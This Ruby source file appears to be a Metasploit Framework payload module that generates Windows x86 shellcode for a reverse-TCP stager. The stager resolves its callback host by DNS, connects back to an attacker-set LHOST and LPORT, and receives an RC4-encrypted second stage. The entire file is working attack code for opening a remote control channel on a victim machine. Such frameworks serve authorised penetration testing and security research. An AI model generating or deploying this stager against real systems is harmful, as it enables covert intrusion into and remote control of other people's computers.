# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/reverse_tcp_rc4'
require 'msf/core/payload/windows/reverse_tcp_dns'

module Msf

###
#
# Complex reverse_tcp_rc4 payload generation for Windows ARCH_X86
#
###

module Payload::Windows::ReverseTcpRc4Dns

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseTcpRc4
  include Msf::Payload::Windows::ReverseTcpDns

  #
  # Generate the first stage
  #
  def generate
    xorkey, rc4key = rc4_keys(datastore['RC4PASSWORD'])
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
      xorkey:      xorkey,
      rc4key:      rc4key,
      reliable:    false
    }

    # Generate the advanced stager if we have space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_tcp_rc4_dns(conf)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp_rc4_dns(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_tcp_dns(opts)}
      #{asm_block_recv_rc4(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

end

end

